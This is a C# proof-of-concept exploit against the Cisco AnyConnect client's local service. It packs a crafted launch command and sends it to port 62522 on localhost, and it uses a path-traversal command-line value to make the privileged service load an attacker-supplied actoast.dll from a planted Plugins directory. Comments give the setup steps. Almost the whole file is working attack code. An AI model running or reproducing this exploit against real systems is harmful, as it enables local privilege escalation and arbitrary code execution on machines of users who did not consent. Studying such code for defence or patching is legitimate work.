using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Reflection;
using System.IO;

namespace CiscoAnyconnectExploit
{
    class Class1
    {
        static byte[] PackCommand(byte[] data, string progpath)
        {
            MemoryStream stm = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm);

            writer.Write(0x4353434f);
            writer.Write((ushort)0x1A);

            writer.Write((ushort)(data.Length+0x4+ finalField(progpath).Length));

            writer.Write(0xFFFFFFFF);
            writer.Write(Encoding.ASCII.GetBytes("\0\0\0\0"));
            writer.Write(0x00000002);
            writer.Write(Encoding.ASCII.GetBytes("\0\0\0\0"));
            writer.Write((byte)1);
            writer.Write((byte)2);
            writer.Write(data);
            writer.Write((ushort)0x0580);
            //Console.WriteLine(Encoding.ASCII.GetBytes("\0\0"));
            writer.Write((ushort)0x0100);
            // TODO
            //try with Relocatable path = brainpoolP160t1
            writer.Write(finalField(progpath));

            return stm.ToArray();
        }

        static byte[] SwapShort(ushort s)
        {
            byte[] bs = BitConverter.GetBytes(s);

            byte tmp = bs[0];
            bs[0] = bs[1];
            bs[1] = tmp;

            return bs;
        }

        static void PackString(BinaryWriter writer, int index, string s)
        {
            writer.Write(SwapShort((ushort)index));
            byte[] bs = Encoding.ASCII.GetBytes(s + "\0");
            writer.Write(SwapShort((ushort)bs.Length));
            writer.Write(bs);
        }

        static byte[] finalField(string path)
        {
            MemoryStream stm = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm);

            PackString(writer, 6, path);

            return stm.ToArray();
        }

        static byte[] PackLaunchCommand(string path, string cmdline, string desktop)
        {
            MemoryStream stm = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm);

            PackString(writer, 1, path);
            PackString(writer, 2, cmdline);
            PackString(writer, 4, desktop);

            return stm.ToArray();
        }

        static string GetBasePath()
        {
            string codebase = Assembly.GetExecutingAssembly().CodeBase;

            return Path.GetDirectoryName(new Uri(codebase, UriKind.Absolute).LocalPath);
        }

        static string GetProgramFiles()
        {
            return Environment.GetFolderPath(Environment.Is64BitOperatingSystem ?
                       Environment.SpecialFolder.ProgramFilesX86 : Environment.SpecialFolder.ProgramFiles);
        }

        public static void Main()
        {
            try
            {
                //string dirpath = "C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\vpndownloader.exe";
                string progpath = Path.Combine(GetProgramFiles(), "Cisco",
                  "Cisco AnyConnect Secure Mobility Client", "vpndownloader.exe");
 
                Console.WriteLine("\"CAC-nc-install\tC:\\WIndows\\system.ini\"");
                //1) Change the Username to your user account directory
                //2) Create directory path "Program Files (x86)/Cisco/Cisco AnyConnect Secure Mobility Client/Plugins/" inside your user home path
                //3) Copy actoast.dll on the above path.
                byte[] data = PackCommand(PackLaunchCommand(progpath,
                         "\"CAC-nc-install\tC:\\Users\\Username\\new\\te\\pe\\ge\\se\\me\\re/../../../../../../../Program Files (x86)/Cisco/Cisco AnyConnect Secure Mobility Client/Plugins/" +
                         "actoast.dll\tC:\\Windows\\system.ini\"", @"WinSta0\Default"), progpath);

                TcpClient client = new TcpClient("127.0.0.1", 62522);
                NetworkStream stm = client.GetStream();
                stm.ReadTimeout = 5000;
                stm.Flush();
                stm.Write(data, 0, data.Length);
                stm.Flush();
                Console.WriteLine(stm.ReadByte());
                client.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
